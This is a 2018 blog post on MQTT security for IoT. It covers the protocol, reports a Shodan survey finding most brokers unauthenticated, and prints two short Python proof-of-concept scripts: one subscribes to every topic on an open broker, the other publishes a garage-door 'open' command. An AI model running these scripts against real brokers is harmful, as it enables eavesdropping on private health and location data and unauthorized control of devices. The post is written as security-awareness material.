---
layout: page
title:  "Hacking IoT with MQTT"
date:   2018-09-12 11:21:21 +0530
categories: ["IoT"]
---
This Post is about MQTT a wide protocol used by IoT devices and some of the security concerns about it.
Here we are perfoming some real examples and proof of concept code (PoC) will also be presented.

This post is organized as follows:

- Introduction
- The Publish/Subscribe Pattern
- Packet Format
- MQTT Security
- Survey: Shodan and Statistics
- What is Out There ?
- Conclusions

**1. Introduction**
MQTT is a M2M protocol created by Andy Stanford-Clark and Arlen Nipper.

MQTT official definition (from mqtt.org):

MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, extremely simple and lightweight messaging protocol, designed for constrained devices and low-bandwidth, high-latency or unreliable networks. The design principles are to minimise network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal of the emerging “machine-to-machine” (M2M) or “Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.

Some of the protocol main features:

- Publish and subscribe pattern
- Simple packet formats: binary payloads
- Current version: 3.1.1 (Dec/2015)
- The protocol runs over TCP
- Default port: 1883/TCP (not encrypted!)

**2. The Publish/Subscribe Pattern**
The publish/subscribe model is composed of:

Publisher: publishes a message to one (or many) topic(s) in the broker.
Subscriber: subscribes to one (or many) topic(s) in the broker and receives all the messages sent from the publisher.
Broker: routes all the messages from the publishers to the subscribers.
Topic: consists of one or more levels that are separated by a a forward slash (e.g., /smartshouse/livingroom/temperature).

![image1](/assets/img/mqtt1.png)

**3. Packet Format**
Every MQTT packet contains a fixed header (Figure 02).
![image2](/assets/img/mqtt2.png)

The first field of the fixed header represents the type of the MQTT Packet. All packet types are listed in table 01.

![image3](/assets/img/mqtt3.png)

**4. MQTT Security**
MQTT official note about security (from mqtt.org):
You can pass a user name and password with an MQTT packet in V3.1 of the protocol. Encryption across the network can be handled with SSL, independently of the MQTT protocol itself (it is worth noting that SSL is not the lightest of protocols, and does add significant network overhead). Additional security can be added by an application encrypting data that it sends and receives, but this is not something built-in to the protocol, in order to keep it simple and lightweight.

Clients can authenticate to the MQTT Broker sending a user name and password with the CONNECT packet.
![image4](/assets/img/mqtt4.png)

The CONNACK Packet is the packet sent by the MQTT Broker in response to a CONNECT Packet received from the client. The CONNACK packet header contains a "return code" field that represents the result of the authentication (e.g, Connection Accepted). All return code values are listed in table 02.
![image5](/assets/img/mqtt5.png)

Two points to consider:

- First: Authentication is totally optional (More of this in Section 5).
- Second: Even if authentication is being performed, encryption is not used by default (credentials are sent in clear text).   MITM attacks can still be executed to steal passwords.

**5. Survey: Shodan and Statistics**
We can use Shodan to see how many MQTT servers can be found in the Internet. A brief search with "port:1883" returns more than 5 lakh hosts. Most of the MQTT servers can be found in China and the United States (almost 40% of the total).
![image6](/assets/img/mqtt6.png)

But is security really being implemented in these MQTT servers ?

A Python script was created to connect to a subset of the hosts found with Shodan and verify if (at least) authentication is being used. We can check the "Return Code" field from the CONNACK packet to confirm this. Figure 05 shows the connection results obtained from the python script with a total of 800 MQTT Servers.
![image7](/assets/img/mqtt7.png)

We can see that most MQTT Servers don't even use authentication (almost 70%). Only 11% of all hosts returned us a "Bad user name or password" code in the CONNACK packet (I wonder if they use default passwords !?).

**6. What is Out There ?**
You can connect to a server and subscribe to all topics with a simple script:

``` 
import paho.mqtt.client as mqtt
def on_connect(client, userdata, flags, rc):
   print "[+] Connection successful"
   client.subscribe('#', qos = 1)        # Subscribe to all topics
   client.subscribe('$SYS/#')            # Broker Status (Mosquitto)
def on_message(client, userdata, msg):
   print '[+] Topic: %s - Message: %s' % (msg.topic, msg.payload)
client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.on_message = on_message
client.connect('SERVER IP HERE', 1883, 60)
client.loop_forever()
```
A summary of some of the open MQTT servers found in the wild:

Different kinds of IoT devices

- Sensors: Light and temperature values
- Fitness devices: Fitbit
- Health devices: Blood Pressure Monitors
- Location services: Owntracks (really creepy stuff!)
- Home automation kits: SmartThings (Samsung)

Examples of open MQTT servers can be seen in figures 06 and 07:
![images9](/assets/img/mqtt9.png)
![images10](/assets/img/mqtt10.png)

A frightening security risk appears when an attacker is able to control IoT devices by publishing commands to a MQTT topic (e.g., turn off the lights and open the garage door). A simple python script to open a fictitious garage door is shown here:

```
import paho.mqtt.client as mqtt
def on_connect(client, userdata, flags, rc):
   print "[+] Connection success"
client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.connect('IP SERVER HERE', 1883, 60)
client.publish('smarthouse/garage/door', "{'open':'true'}")
```
**7. Conclusions**
Security is a big challenge to IoT and embedded devices. Attacks will reduce the gap between the real and virtual world (e.g., attackers being able to remotely control smart houses). Security professionals must understand the new technologies and protocols used by smart devices. I guess we will be seeing more attacks in the IoT using lightweight protocols like MQTT.
